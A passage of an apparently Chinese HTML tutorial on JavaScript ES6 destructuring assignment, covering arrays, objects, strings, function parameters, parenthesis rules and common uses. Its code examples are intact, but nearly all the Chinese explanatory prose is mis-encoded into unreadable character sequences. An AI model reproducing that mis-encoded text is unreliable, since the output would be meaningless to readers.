class="line"></span><br><span class="line"><span class="keyword">let</span> [x, y = <span class="string">&#x27;b&#x27;</span>] = [<span class="string">&#x27;a&#x27;</span>]; <span class="comment">// x=&#x27;a&#x27;, y=&#x27;b&#x27;</span></span><br><span class="line"><span class="keyword">let</span> [x, y = <span class="string">&#x27;b&#x27;</span>] = [<span class="string">&#x27;a&#x27;</span>, <span class="literal">undefined</span>]; <span class="comment">// x=&#x27;a&#x27;, y=&#x27;b&#x27;</span></span><br></pre></td></tr></table></figure><p>æ³¨æ„ï¼ŒES6 å†…éƒ¨ä½¿ç”¨ä¸¥æ ¼ç›¸ç­‰è¿ç®—ç¬¦ï¼ˆ<code>===</code>ï¼‰ï¼Œåˆ¤æ–­ä¸€ä¸ªä½ç½®æ˜¯å¦æœ‰å€¼ã€‚æ‰€ä»¥ï¼Œåªæœ‰å½“ä¸€ä¸ªæ•°ç»„æˆå‘˜ä¸¥æ ¼ç­‰äº<code>undefined</code>ï¼Œé»˜è®¤å€¼æ‰ä¼šç”Ÿæ•ˆã€‚(å¦‚æœä¸€ä¸ªæ•°ç»„æˆå‘˜æ˜¯<code>null</code>ï¼Œé»˜è®¤å€¼å°±ä¸ä¼šç”Ÿæ•ˆï¼Œå› ä¸º<code>null</code>ä¸ä¸¥æ ¼ç­‰äº<code>undefined</code>ã€‚)</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> [x = <span class="number">1</span>] = [<span class="literal">undefined</span>];</span><br><span class="line">x <span class="comment">// 1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> [x = <span class="number">1</span>] = [<span class="literal">null</span>];</span><br><span class="line">x <span class="comment">// null</span></span><br></pre></td></tr></table></figure><h2 id="2ã€å¯¹è±¡çš„è§£æ„èµ‹å€¼"><a href="#2ã€å¯¹è±¡çš„è§£æ„èµ‹å€¼" class="headerlink" title="2ã€å¯¹è±¡çš„è§£æ„èµ‹å€¼"></a>2ã€å¯¹è±¡çš„è§£æ„èµ‹å€¼</h2><h3 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h3><p>æ•°ç»„çš„å…ƒç´ æ˜¯æŒ‰æ¬¡åºæ’åˆ—çš„ï¼Œå˜é‡çš„å–å€¼ç”±å®ƒçš„ä½ç½®å†³å®šï¼›è€Œå¯¹è±¡çš„å±æ€§æ²¡æœ‰æ¬¡åºï¼Œå˜é‡å¿…é¡»ä¸å±æ€§åŒåï¼Œæ‰èƒ½å–åˆ°æ­£ç¡®çš„å€¼ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> &#123; bar, foo &#125; = &#123; <span class="attr">foo</span>: <span class="string">&#x27;aaa&#x27;</span>, <span class="attr">bar</span>: <span class="string">&#x27;bbb&#x27;</span> &#125;;</span><br><span class="line">foo <span class="comment">// &quot;aaa&quot;</span></span><br><span class="line">bar <span class="comment">// &quot;bbb&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> &#123; baz &#125; = &#123; <span class="attr">foo</span>: <span class="string">&#x27;aaa&#x27;</span>, <span class="attr">bar</span>: <span class="string">&#x27;bbb&#x27;</span> &#125;;</span><br><span class="line">baz <span class="comment">// undefined</span></span><br></pre></td></tr></table></figure><p>å¯¹è±¡çš„è§£æ„èµ‹å€¼ï¼Œå¯ä»¥å¾ˆæ–¹ä¾¿åœ°å°†ç°æœ‰å¯¹è±¡çš„æ–¹æ³•ï¼Œèµ‹å€¼åˆ°æŸä¸ªå˜é‡ï¼Œå¦‚ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ä¾‹ä¸€</span></span><br><span class="line"><span class="keyword">let</span> &#123; log, sin, cos &#125; = <span class="built_in">Math</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä¾‹äºŒ</span></span><br><span class="line"><span class="keyword">const</span> &#123; log &#125; = <span class="built_in">console</span>;</span><br><span class="line">log(<span class="string">&#x27;hello&#x27;</span>) <span class="comment">// hello</span></span><br></pre></td></tr></table></figure><p>ä¾‹ä¸€å°†<code>Math</code>å¯¹è±¡çš„å¯¹æ•°ã€æ­£å¼¦ã€ä½™å¼¦ä¸‰ä¸ªæ–¹æ³•ï¼Œèµ‹å€¼åˆ°å¯¹åº”çš„å˜é‡ä¸Šï¼Œä½¿ç”¨èµ·æ¥å°±ä¼šæ–¹ä¾¿å¾ˆå¤šã€‚ä¾‹äºŒå°†<code>console.log</code>èµ‹å€¼åˆ°<code>log</code>å˜é‡ã€‚</p><p>å®é™…ä¸Šï¼Œå¯¹è±¡çš„è§£æ„èµ‹å€¼æ˜¯ä¸‹é¢å½¢å¼çš„ç®€å†™ï¼ˆå‚è§ã€Šå¯¹è±¡çš„æ‰©å±•ã€‹ä¸€ç« ï¼‰ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> &#123; <span class="attr">foo</span>: foo, <span class="attr">bar</span>: bar &#125; = &#123; <span class="attr">foo</span>: <span class="string">&#x27;aaa&#x27;</span>, <span class="attr">bar</span>: <span class="string">&#x27;bbb&#x27;</span> &#125;;</span><br></pre></td></tr></table></figure><p>å¯¹è±¡çš„è§£æ„èµ‹å€¼çš„<strong>å†…éƒ¨æœºåˆ¶</strong>ï¼Œæ˜¯å…ˆæ‰¾åˆ°åŒåå±æ€§(å³åŒ¹é…çš„æ¨¡å¼)ï¼Œç„¶åå†èµ‹ç»™å¯¹åº”çš„å˜é‡ã€‚çœŸæ­£è¢«èµ‹å€¼çš„æ˜¯åè€…ï¼Œè€Œä¸æ˜¯å‰è€…ã€‚</p><p>ä¸æ•°ç»„ä¸€æ ·ï¼Œè§£æ„ä¹Ÿå¯ä»¥ç”¨äºåµŒå¥—ç»“æ„çš„å¯¹è±¡ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> obj = &#123;</span><br><span class="line">  <span class="attr">p</span>: [</span><br><span class="line">    <span class="string">&#x27;Hello&#x27;</span>,</span><br><span class="line">    &#123; <span class="attr">y</span>: <span class="string">&#x27;World&#x27;</span> &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> &#123; <span class="attr">p</span>: [x, &#123; y &#125;] &#125; = obj;</span><br><span class="line">x <span class="comment">// &quot;Hello&quot;</span></span><br><span class="line">y <span class="comment">// &quot;World&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> node = &#123;</span><br><span class="line">  <span class="attr">loc</span>: &#123;</span><br><span class="line">    <span class="attr">start</span>: &#123;</span><br><span class="line">      <span class="attr">line</span>: <span class="number">1</span>,</span><br><span class="line">      <span class="attr">column</span>: <span class="number">5</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> &#123; loc, <span class="attr">loc</span>: &#123; start &#125;, <span class="attr">loc</span>: &#123; <span class="attr">start</span>: &#123; line &#125;&#125; &#125; = node;</span><br><span class="line">line <span class="comment">// 1</span></span><br><span class="line">loc  <span class="comment">// Object &#123;start: Object&#125;</span></span><br><span class="line">start <span class="comment">// Object &#123;line: 1, column: 5&#125;</span></span><br></pre></td></tr></table></figure><p>æœ€åä¸€æ¬¡å¯¹<code>line</code>å±æ€§çš„è§£æ„èµ‹å€¼ä¹‹ä¸­ï¼Œåªæœ‰<code>line</code>æ˜¯å˜é‡ï¼Œ<code>loc</code>å’Œ<code>start</code>éƒ½æ˜¯æ¨¡å¼ï¼Œä¸æ˜¯å˜é‡ã€‚</p><p>åµŒå¥—èµ‹å€¼çš„ä¾‹å­:</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> obj = &#123;&#125;;</span><br><span class="line"><span class="keyword">let</span> arr = [];</span><br><span class="line"></span><br><span class="line">(&#123; <span class="attr">foo</span>: obj.prop, <span class="attr">bar</span>: arr[<span class="number">0</span>] &#125; = &#123; <span class="attr">foo</span>: <span class="number">123</span>, <span class="attr">bar</span>: <span class="literal">true</span> &#125;);</span><br><span class="line"></span><br><span class="line">obj <span class="comment">// &#123;prop:123&#125;</span></span><br><span class="line">arr <span class="comment">// [true]</span></span><br></pre></td></tr></table></figure><p>æ³¨æ„ï¼Œå¯¹è±¡çš„è§£æ„èµ‹å€¼å¯ä»¥å–åˆ°ç»§æ‰¿çš„å±æ€§ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> obj1 = &#123;&#125;;</span><br><span class="line"><span class="keyword">const</span> obj2 = &#123; <span class="attr">foo</span>: <span class="string">&#x27;bar&#x27;</span> &#125;;</span><br><span class="line"><span class="built_in">Object</span>.setPrototypeOf(obj1, obj2);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> &#123; foo &#125; = obj1;</span><br><span class="line">foo <span class="comment">// &quot;bar&quot;</span></span><br></pre></td></tr></table></figure><p>ä¸Šé¢ä»£ç ä¸­ï¼Œå¯¹è±¡<code>obj1</code>çš„åŸå‹å¯¹è±¡æ˜¯<code>obj2</code>ã€‚<code>foo</code>å±æ€§ä¸æ˜¯<code>obj1</code>è‡ªèº«çš„å±æ€§ï¼Œè€Œæ˜¯ç»§æ‰¿è‡ª<code>obj2</code>çš„å±æ€§ã€‚</p><h3 id="é»˜è®¤å€¼-1"><a href="#é»˜è®¤å€¼-1" class="headerlink" title="é»˜è®¤å€¼"></a>é»˜è®¤å€¼</h3><p>åŸºæœ¬åŒæ•°ç»„è§£æ„èµ‹å€¼çš„é»˜è®¤å€¼ã€‚é»˜è®¤å€¼ç”Ÿæ•ˆçš„æ¡ä»¶æ˜¯ï¼Œå¯¹è±¡çš„å±æ€§å€¼ä¸¥æ ¼ç­‰äº<code>undefined</code>ã€‚</p><h3 id="æ³¨æ„ç‚¹"><a href="#æ³¨æ„ç‚¹" class="headerlink" title="æ³¨æ„ç‚¹"></a>æ³¨æ„ç‚¹</h3><p>ï¼ˆ1ï¼‰å¦‚æœè¦å°†ä¸€ä¸ªå·²ç»å£°æ˜çš„å˜é‡ç”¨äºè§£æ„èµ‹å€¼ï¼Œå¿…é¡»éå¸¸å°å¿ƒã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// é”™è¯¯çš„å†™æ³•</span></span><br><span class="line"><span class="keyword">let</span> x;</span><br><span class="line">&#123;x&#125; = &#123;<span class="attr">x</span>: <span class="number">1</span>&#125;;</span><br><span class="line"><span class="comment">// SyntaxError: syntax error</span></span><br></pre></td></tr></table></figure><p>ä¸Šé¢çš„ä»£ç ä¼šæŠ¥é”™ï¼Œå› ä¸º JavaScript å¼•æ“ä¼šå°†<code>&#123;x&#125;</code>ç†è§£æˆä¸€ä¸ª<strong>ä»£ç å—</strong>ï¼Œä»è€Œå‘ç”Ÿè¯­æ³•é”™è¯¯ã€‚åªæœ‰ä¸å°†å¤§æ‹¬å·å†™åœ¨è¡Œé¦–ï¼Œé¿å… JavaScript å°†å…¶è§£é‡Šä¸ºä»£ç å—ï¼Œæ‰èƒ½è§£å†³è¿™ä¸ªé—®é¢˜ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// æ­£ç¡®çš„å†™æ³•</span></span><br><span class="line"><span class="keyword">let</span> x;</span><br><span class="line">(&#123;x&#125; = &#123;<span class="attr">x</span>: <span class="number">1</span>&#125;);</span><br></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰è§£æ„èµ‹å€¼å…è®¸ç­‰å·å·¦è¾¹çš„æ¨¡å¼ä¹‹ä¸­ï¼Œä¸æ”¾ç½®ä»»ä½•å˜é‡åã€‚å› æ­¤ï¼Œå¯ä»¥å†™å‡ºéå¸¸å¤æ€ªçš„èµ‹å€¼è¡¨è¾¾å¼ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(&#123;&#125; = [<span class="literal">true</span>, <span class="literal">false</span>]);</span><br><span class="line">(&#123;&#125; = <span class="string">&#x27;abc&#x27;</span>);</span><br><span class="line">(&#123;&#125; = []);</span><br></pre></td></tr></table></figure><p>ï¼ˆ3ï¼‰ç”±äºæ•°ç»„æœ¬è´¨æ˜¯ç‰¹æ®Šçš„å¯¹è±¡ï¼Œå› æ­¤å¯ä»¥å¯¹æ•°ç»„è¿›è¡Œå¯¹è±¡å±æ€§çš„è§£æ„ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="keyword">let</span> &#123;<span class="number">0</span> : first, [arr.length - <span class="number">1</span>] : last&#125; = arr;</span><br><span class="line">first <span class="comment">// 1</span></span><br><span class="line">last <span class="comment">// 3</span></span><br></pre></td></tr></table></figure><h2 id="3ã€å­—ç¬¦ä¸²çš„è§£æ„èµ‹å€¼"><a href="#3ã€å­—ç¬¦ä¸²çš„è§£æ„èµ‹å€¼" class="headerlink" title="3ã€å­—ç¬¦ä¸²çš„è§£æ„èµ‹å€¼"></a>3ã€å­—ç¬¦ä¸²çš„è§£æ„èµ‹å€¼</h2><p>å­—ç¬¦ä¸²ä¹Ÿå¯ä»¥è§£æ„èµ‹å€¼ã€‚å› ä¸ºæ­¤æ—¶å­—ç¬¦ä¸²è¢«è½¬æ¢æˆäº†ä¸€ä¸ªç±»ä¼¼æ•°ç»„çš„å¯¹è±¡ã€‚ç±»ä¼¼æ•°ç»„çš„å¯¹è±¡éƒ½æœ‰ä¸€ä¸ª<code>length</code>å±æ€§ï¼Œå› æ­¤è¿˜å¯ä»¥å¯¹è¿™ä¸ªå±æ€§è§£æ„èµ‹å€¼ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> &#123;<span class="attr">length</span> : len&#125; = <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line">len <span class="comment">// 5</span></span><br></pre></td></tr></table></figure><h2 id="4ã€æ•°å€¼å’Œå¸ƒå°”å€¼çš„è§£æ„èµ‹å€¼"><a href="#4ã€æ•°å€¼å’Œå¸ƒå°”å€¼çš„è§£æ„èµ‹å€¼" class="headerlink" title="4ã€æ•°å€¼å’Œå¸ƒå°”å€¼çš„è§£æ„èµ‹å€¼"></a>4ã€æ•°å€¼å’Œå¸ƒå°”å€¼çš„è§£æ„èµ‹å€¼</h2><p>è§£æ„èµ‹å€¼æ—¶ï¼Œå¦‚æœç­‰å·å³è¾¹æ˜¯æ•°å€¼å’Œå¸ƒå°”å€¼ï¼Œåˆ™ä¼šå…ˆè½¬ä¸ºå¯¹è±¡ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> &#123;<span class="attr">toString</span>: s&#125; = <span class="number">123</span>;</span><br><span class="line">s === <span class="built_in">Number</span>.prototype.toString <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> &#123;<span class="attr">toString</span>: s&#125; = <span class="literal">true</span>;</span><br><span class="line">s === <span class="built_in">Boolean</span>.prototype.toString <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> &#123; <span class="attr">prop</span>: x &#125; = <span class="literal">undefined</span>; <span class="comment">// TypeError</span></span><br><span class="line"><span class="keyword">let</span> &#123; <span class="attr">prop</span>: y &#125; = <span class="literal">null</span>; <span class="comment">// TypeError</span></span><br></pre></td></tr></table></figure><p>ä¸Šé¢ä»£ç ä¸­ï¼Œæ•°å€¼å’Œå¸ƒå°”å€¼çš„åŒ…è£…å¯¹è±¡éƒ½æœ‰<code>toString</code>å±æ€§ï¼Œå› æ­¤å˜é‡<code>s</code>éƒ½èƒ½å–åˆ°å€¼ã€‚</p><p>è§£æ„èµ‹å€¼çš„è§„åˆ™æ˜¯ï¼Œåªè¦ç­‰å·å³è¾¹çš„å€¼ä¸æ˜¯å¯¹è±¡æˆ–æ•°ç»„ï¼Œå°±å…ˆå°†å…¶è½¬ä¸ºå¯¹è±¡ã€‚ç”±äº<code>undefined</code>å’Œ<code>null</code>æ— æ³•è½¬ä¸ºå¯¹è±¡ï¼Œæ‰€ä»¥å¯¹å®ƒä»¬è¿›è¡Œè§£æ„èµ‹å€¼ï¼Œéƒ½ä¼šæŠ¥é”™ã€‚</p><h2 id="5ã€å‡½æ•°å‚æ•°çš„è§£æ„èµ‹å€¼"><a href="#5ã€å‡½æ•°å‚æ•°çš„è§£æ„èµ‹å€¼" class="headerlink" title="5ã€å‡½æ•°å‚æ•°çš„è§£æ„èµ‹å€¼"></a>5ã€å‡½æ•°å‚æ•°çš„è§£æ„èµ‹å€¼</h2><p>ä¾‹å­ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[[<span class="number">1</span>, <span class="number">2</span>], [<span class="number">3</span>, <span class="number">4</span>]].map(<span class="function">(<span class="params">[a, b]</span>) =&gt;</span> a + b);</span><br><span class="line"><span class="comment">// [ 3, 7 ]</span></span><br></pre></td></tr></table></figure><p>å‡½æ•°å‚æ•°çš„è§£æ„ä¹Ÿå¯ä»¥ä½¿ç”¨é»˜è®¤å€¼ã€‚<code>undefined</code>ä¼šè§¦å‘å‡½æ•°å‚æ•°çš„é»˜è®¤å€¼ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[<span class="number">1</span>, <span class="literal">undefined</span>, <span class="number">3</span>].map(<span class="function">(<span class="params">x = <span class="string">&#x27;yes&#x27;</span></span>) =&gt;</span> x);</span><br><span class="line"><span class="comment">// [ 1, &#x27;yes&#x27;, 3 ]</span></span><br></pre></td></tr></table></figure><h2 id="6ã€åœ†æ‹¬å·é—®é¢˜"><a href="#6ã€åœ†æ‹¬å·é—®é¢˜" class="headerlink" title="6ã€åœ†æ‹¬å·é—®é¢˜"></a>6ã€åœ†æ‹¬å·é—®é¢˜</h2><p>å»ºè®®åªè¦æœ‰å¯èƒ½ï¼Œå°±ä¸è¦åœ¨æ¨¡å¼ä¸­æ”¾ç½®åœ†æ‹¬å·ã€‚</p><h3 id="ä¸èƒ½ä½¿ç”¨åœ†æ‹¬å·çš„æƒ…å†µ"><a href="#ä¸èƒ½ä½¿ç”¨åœ†æ‹¬å·çš„æƒ…å†µ" class="headerlink" title="ä¸èƒ½ä½¿ç”¨åœ†æ‹¬å·çš„æƒ…å†µ"></a>ä¸èƒ½ä½¿ç”¨åœ†æ‹¬å·çš„æƒ…å†µ</h3><p>ï¼ˆ1ï¼‰å˜é‡å£°æ˜è¯­å¥ ï¼ˆæ¨¡å¼ä¸èƒ½ä½¿ç”¨åœ†æ‹¬å·ï¼‰</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// å…¨éƒ¨æŠ¥é”™</span></span><br><span class="line"><span class="keyword">let</span> [(a)] = [<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> &#123;<span class="attr">x</span>: (c)&#125; = &#123;&#125;;</span><br><span class="line"><span class="keyword">let</span> (&#123;<span class="attr">x</span>: c&#125;) = &#123;&#125;;</span><br><span class="line"><span class="keyword">let</span> &#123;(x: c)&#125; = &#123;&#125;;</span><br><span class="line"><span class="keyword">let</span> &#123;(x): c&#125; = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> &#123; <span class="attr">o</span>: (&#123; <span class="attr">p</span>: p &#125;) &#125; = &#123; <span class="attr">o</span>: &#123; <span class="attr">p</span>: <span class="number">2</span> &#125; &#125;;</span><br></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰å‡½æ•°å‚æ•° ï¼ˆä¹Ÿå±äºå˜é‡å£°æ˜ï¼‰</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// æŠ¥é”™</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">[(z)]</span>) </span>&#123; <span class="keyword">return</span> z; &#125;</span><br><span class="line"><span class="comment">// æŠ¥é”™</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">[z,(x)]</span>) </span>&#123; <span class="keyword">return</span> x; &#125;</span><br></pre></td></tr></table></figure><p>ï¼ˆ3ï¼‰èµ‹å€¼è¯­å¥çš„æ¨¡å¼</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// å…¨éƒ¨æŠ¥é”™</span></span><br><span class="line">(&#123; <span class="attr">p</span>: a &#125;) = &#123; <span class="attr">p</span>: <span class="number">42</span> &#125;;</span><br><span class="line">([a]) = [<span class="number">5</span>];</span><br><span class="line">[(&#123; <span class="attr">p</span>: a &#125;), &#123; <span class="attr">x</span>: c &#125;] = [&#123;&#125;, &#123;&#125;];</span><br></pre></td></tr></table></figure><h3 id="å¯ä»¥ä½¿ç”¨åœ†æ‹¬å·çš„æƒ…å†µ"><a href="#å¯ä»¥ä½¿ç”¨åœ†æ‹¬å·çš„æƒ…å†µ" class="headerlink" title="å¯ä»¥ä½¿ç”¨åœ†æ‹¬å·çš„æƒ…å†µ"></a>å¯ä»¥ä½¿ç”¨åœ†æ‹¬å·çš„æƒ…å†µ</h3><p>ï¼ˆ1ï¼‰èµ‹å€¼è¯­å¥çš„éæ¨¡å¼éƒ¨åˆ†</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">[(b)] = [<span class="number">3</span>]; <span class="comment">// æ­£ç¡®ï¼Œæ¨¡å¼æ˜¯å–æ•°ç»„çš„ç¬¬ä¸€ä¸ªæˆå‘˜ï¼Œè·Ÿåœ†æ‹¬å·æ— å…³</span></span><br><span class="line">(&#123; <span class="attr">p</span>: (d) &#125; = &#123;&#125;); <span class="comment">// æ­£ç¡®ï¼Œæ¨¡å¼æ˜¯pï¼Œè€Œä¸æ˜¯d</span></span><br><span class="line">[(<span class="built_in">parseInt</span>.prop)] = [<span class="number">3</span>]; <span class="comment">// æ­£ç¡®ï¼ŒåŒä¸€</span></span><br></pre></td></tr></table></figure><h2 id="7ã€ç”¨é€”"><a href="#7ã€ç”¨é€”" class="headerlink" title="7ã€ç”¨é€”"></a>7ã€ç”¨é€”</h2><p><strong>ï¼ˆ1ï¼‰äº¤æ¢å˜é‡çš„å€¼</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> x = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">let</span> y = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">[x, y] = [y, x];</span><br></pre></td></tr></table></figure><p><strong>ï¼ˆ2ï¼‰ä»å‡½æ•°è¿”å›å¤šä¸ªå€¼</strong></p><p>å‡½æ•°åªèƒ½è¿”å›ä¸€ä¸ªå€¼ï¼Œå¦‚æœè¦è¿”å›å¤šä¸ªå€¼ï¼Œåªèƒ½å°†å®ƒä»¬æ”¾åœ¨æ•°ç»„æˆ–å¯¹è±¡é‡Œè¿”å›ã€‚æœ‰äº†è§£æ„èµ‹å€¼ï¼Œå–å‡ºè¿™äº›å€¼å°±éå¸¸æ–¹ä¾¿ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// è¿”å›ä¸€ä¸ªæ•°ç»„</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">example</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> [a, b, c] = example();</span><br><span class="line"></span><br><span class="line"><span class="comment">// è¿”å›ä¸€ä¸ªå¯¹è±¡</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">example</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    <span class="attr">foo</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="attr">bar</span>: <span class="number">2</span></span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> &#123; foo, bar &#125; = example();</span><br></pre></td></tr></table></figure><p><strong>ï¼ˆ3ï¼‰å‡½æ•°å‚æ•°çš„å®šä¹‰</strong></p><p>è§£æ„èµ‹å€¼å¯ä»¥æ–¹ä¾¿åœ°å°†ä¸€ç»„å‚æ•°ä¸å˜é‡åå¯¹åº”èµ·æ¥ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// å‚æ•°æ˜¯ä¸€ç»„æœ‰æ¬¡åºçš„å€¼</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">[x, y, z]</span>) </span>&#123; ... &#125;</span><br><span class="line">f([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// å‚æ•°æ˜¯ä¸€ç»„æ— æ¬¡åºçš„å€¼</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">&#123;x, y, z&#125;</span>) </span>&#123; ... &#125;</span><br><span class="line">f(&#123;<span class="attr">z</span>: <span class="number">3</span>, <span class="attr">y</span>: <span class="number">2</span>, <span class="attr">x</span>: <span class="number">1</span>&#125;);</span><br></pre></td></tr></table></figure><p><strong>ï¼ˆ4ï¼‰æå– JSON æ•°æ®</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> jsonData = &#123;</span><br><span class="line">  <span class="attr">id</span>: <span class="number">42</span>,</span><br><span class="line">  <span class="attr">status</span>: <span class="string">&quot;OK&quot;</span>,</span><br><span class="line">  <span class="attr">data</span>: [<span class="number">867</span>, <span class="number">5309</span>]</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> &#123; id, status, <span class="attr">data</span>: number &#125; = jsonData;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(id, status, number);</span><br><span class="line"><span class="comment">// 42, &quot;OK&quot;, [867, 5309]</span></span><br></pre></td></tr></table></figure><p><strong>ï¼ˆ5ï¼‰å‡½æ•°å‚æ•°çš„é»˜è®¤å€¼</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">jQuery.ajax = <span class="function"><span class="keyword">function</span> (<span class="params">url, &#123;</span></span></span><br><span class="line"><span class="params"><span class="function">  <span class="keyword">async</span> = <span class="literal">true</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">  beforeSend = <span class="keyword">function</span> () &#123;&#125;,</span></span></span><br><span class="line"><span class="params"><span class="function">  cache = <span class="literal">true</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">  complete = <span class="keyword">function</span> () &#123;&#125;,</span></span></span><br><span class="line"><span class="params"><span class="function">  crossDomain = <span class="literal">false</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">  <span class="built_in">global</span> = <span class="literal">true</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">  <span class="regexp">//</span> ... more config</span></span></span><br><span class="line"><span class="params"><span class="function">&#125; = &#123;&#125;</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// ... do stuff</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>è¿™æ ·å¯é¿å…åœ¨å‡½æ•°ä½“å†…éƒ¨å†å†™<code>var foo = config.foo || &#39;default foo&#39;;</code>è¿™æ ·çš„è¯­å¥ã€‚</p><p><strong>ï¼ˆ6ï¼‰éå† Map ç»“æ„</strong></p><p>ä»»ä½•éƒ¨ç½²äº† Iterator æ¥å£çš„å¯¹è±¡ï¼Œéƒ½å¯ä»¥ç”¨<code>for...of</code>å¾ªç¯éå†ã€‚Map ç»“æ„åŸç”Ÿæ”¯æŒ Iterator æ¥å£ï¼Œé…åˆå˜é‡çš„è§£æ„èµ‹å€¼ï¼Œè·å–é”®åå’Œé”®å€¼å°±éå¸¸æ–¹ä¾¿ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> map = <span class="keyword">new</span> <span class="built_in">Map</span>();</span><br><span class="line">map.set(<span class="string">&#x27;first&#x27;</span>, <span class="string">&#x27;hello&#x27;</span>);</span><br><span class="line">map.set(<span class="string">&#x27;second&#x27;</span>, <span class="string">&#x27;world&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> [key, value] <span class="keyword">of</span> map) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(key + <span class="string">&quot; is &quot;</span> + value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// first is hello</span></span><br><span class="line"><span class="comment">// second is world</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// è·å–é”®å</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> [key] <span class="keyword">of</span> map) &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// è·å–é”®å€¼</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> [,value] <span class="keyword">of</span> map) &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>7ï¼‰è¾“å…¥æ¨¡å—çš„æŒ‡å®šæ–¹æ³•</strong>ï¼ˆä¸å¤ªç†è§£ï¼‰</p><p>åŠ 